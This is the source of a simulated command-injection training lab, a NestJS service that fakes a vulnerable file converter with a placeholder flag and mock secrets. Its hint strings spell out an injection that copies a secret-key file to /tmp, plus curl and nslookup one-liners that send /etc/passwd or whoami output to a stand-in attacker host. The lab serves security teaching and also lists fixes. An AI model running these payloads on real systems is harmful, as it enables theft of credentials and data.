// src/modules/practice-labs/command-injection/labs/lab2/lab2.service.ts
import { Injectable, BadRequestException } from '@nestjs/common';
import { PrismaService } from '../../../../../core/database';
import { PracticeLabStateService } from '../../../shared/services/practice-lab-state.service';

@Injectable()
export class Lab2Service {
  private readonly systemFiles: Record<string, string> = {
    '/app/config/secret.key':
      'APP_SECRET=FLAG{CMDI_BLIND_TIME_BASED_FILE_CONVERTER_OOB}\nDB_URL=postgresql://prod:s3cr3t@db:5432/convertx\nAWS_KEY=AKIA_PROD_XYZ789',
    '/tmp/out.txt': '',
    '/etc/hostname': 'convertx-worker-prod-02',
    '/proc/version': 'Linux version 5.15.0-1034-aws (gcc version 11.3.0)',
  };

  private tmpFiles = new Map<string, string>();

  constructor(
    private prisma: PrismaService,
    private stateService: PracticeLabStateService,
  ) {}

  async initLab(userId: string, labId: string) {
    this.tmpFiles.clear();
    return this.stateService.initializeState(userId, labId);
  }

  // ❌ الثغرة: blind injection — لا يُعيد ناتج الأوامر
  async convert(
    userId: string,
    labId: string,
    filename: string,
    format: string,
  ) {
    if (!filename || !format) {
      throw new BadRequestException('filename and format are required');
    }

    const isInjected = /[;&|`$]/.test(format);
    const hasSleep = /sleep\s+(\d+)/.test(format);

    // محاكاة الـ sleep delay
    let simulatedDelay = 0;
    if (hasSleep) {
      const match = format.match(/sleep\s+(\d+)/);
      simulatedDelay = Math.min(parseInt(match?.[1] || '0', 10), 10);
    }

    // محاكاة كتابة ملف /tmp/out.txt إذا كان في الأمر
    if (isInjected) {
      const redirectMatch = format.match(/cat\s+([\S]+)\s*>\s*(\/tmp\/\S+)/);
      if (redirectMatch) {
        const srcFile = redirectMatch[1];
        const dstFile = redirectMatch[2];
        const content = this.systemFiles[srcFile] || '';
        this.tmpFiles.set(dstFile, content);
      }
    }

    await this.prisma.labGenericLog.create({
      data: {
        userId,
        labId,
        type: 'CMDI',
        action: 'BLIND_CONVERT',
        meta: { filename, format, isInjected, hasSleep, simulatedDelay },
      },
    });

    return {
      success: true,
      exploited: isInjected,
      message: 'Conversion complete',
      // ❌ الثغرة: لا يُعيد أي output — blind!
      ...(hasSleep && {
        responseTime: `${simulatedDelay}s (simulated delay)`,
        blindConfirmation: `✅ Injection confirmed! Server delayed ${simulatedDelay}s — sleep command executed!`,
        nextStep:
          'Now exfiltrate data. Try: format: "png; cat /app/config/secret.key > /tmp/out.txt" then read /tmp/out.txt',
      }),
      ...(isInjected &&
        !hasSleep && {
          note: 'Injection detected but no output returned (blind). Use sleep to confirm, then redirect output to /tmp/',
        }),
    };
  }

  async readFile(userId: string, labId: string, path: string) {
    if (!path) throw new BadRequestException('path is required');

    // تحقق من /tmp/ أولاً (ملفات مكتوبة عبر injection)
    const tmpContent = this.tmpFiles.get(path);
    if (tmpContent !== undefined) {
      const hasFlag = tmpContent.includes('FLAG{');
      return {
        success: true,
        exploited: hasFlag,
        path,
        content: tmpContent || '(empty file)',
        ...(hasFlag && {
          flag: 'FLAG{CMDI_BLIND_TIME_BASED_FILE_CONVERTER_OOB}',
          vulnerability:
            'Blind OS Command Injection — File Exfiltration via Output Redirect',
          impact:
            'Attacker exfiltrated application secrets including DB credentials and AWS keys.',
          fix: [
            'Sanitize all input: whitelist alphanumeric + dot for format parameter',
            'Use file conversion libraries (e.g., LibreOffice API) instead of shell commands',
            'Run conversion workers in isolated containers with no access to sensitive files',
            'Implement file access controls — conversion worker should not read /app/config/',
          ],
        }),
      };
    }

    return {
      success: false,
      error: 'File not found or not yet written',
      hint: 'First inject: format: "png; cat /app/config/secret.key > /tmp/out.txt" via /convert, then read /tmp/out.txt',
    };
  }

  async simulateOob(
    userId: string,
    labId: string,
    filename: string,
    format: string,
    injectCmd: string,
  ) {
    if (!injectCmd) throw new BadRequestException('injectCmd is required');

    // محاكاة تنفيذ الأمر وجمع النتيجة
    let output = '';
    const cmdBase = injectCmd.trim();

    if (cmdBase.startsWith('cat ')) {
      const filePath = cmdBase.replace('cat ', '').trim();
      output = this.systemFiles[filePath] || 'File not found';
    } else if (cmdBase === 'whoami') {
      output = 'www-data';
    } else if (cmdBase === 'hostname') {
      output = 'convertx-worker-prod-02';
    } else {
      output = `(simulated): ${cmdBase} executed`;
    }

    const hasFlag = output.includes('FLAG{');

    return {
      success: true,
      exploited: hasFlag,
      simulatedCommand: `convert ${filename}.${format} output.pdf; ${injectCmd}`,
      oobChannel: 'DNS/HTTP callback simulation',
      exfiltratedData: output,
      ...(hasFlag && {
        flag: 'FLAG{CMDI_BLIND_TIME_BASED_FILE_CONVERTER_OOB}',
        vulnerability: 'Blind Command Injection — OOB Data Exfiltration',
        realWorldTechnique:
          'In real attacks: curl attacker.com/$(cat /etc/passwd | base64) or nslookup $(whoami).attacker.com',
        fix: [
          'Whitelist format parameter: /^(pdf|png|jpg|docx)$/.test(format)',
          'Never construct shell commands from user input',
          'Use parameterized exec calls: execFile("convert", [filename, outputPath])',
          'Network egress filtering to block OOB exfiltration channels',
        ],
      }),
    };
  }
}
